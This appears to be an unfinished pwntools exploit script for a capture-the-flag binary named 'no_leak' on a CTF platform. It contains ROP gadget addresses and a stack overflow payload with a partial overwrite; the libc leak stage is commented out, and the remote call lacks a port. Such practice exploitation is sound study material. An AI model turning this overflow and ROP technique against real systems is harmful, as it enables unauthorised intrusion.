import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./no_leak')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./no_leak')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('node3.buuoj.cn',)
			elf=ELF('./no_leak')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')


		gdb.attach(io)
		pause()

		pop_rbx_rbp_r12_r13_r14_r15_ret=0x00000000004005ca
		pop_rbp_r12_r13_r14_r15_ret=0x00000000004005cb
		pop_rsp_r13_r14_r15_ret=0x00000000004005cd
		pop_r12_r13_r14_r15_ret=0x00000000004005cc
		pop_r13_r14_r15_ret=0x00000000004005ce
		pop_rsi_r15_ret=0x00000000004005d1
		pop_rdi_ret=0x00000000004005d3
		make_call=0x00000000004005B0
		ret=0x0000000000400416
		main_addr=0x400537
		bss100=elf.bss()+0x100
		bss300=elf.bss()+0x300
		bss400=elf.bss()+0x400
		pay='a'*0x88+'\x53'
		io.send(pay)
		io.send(pay)
		#io.send(pay)




		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue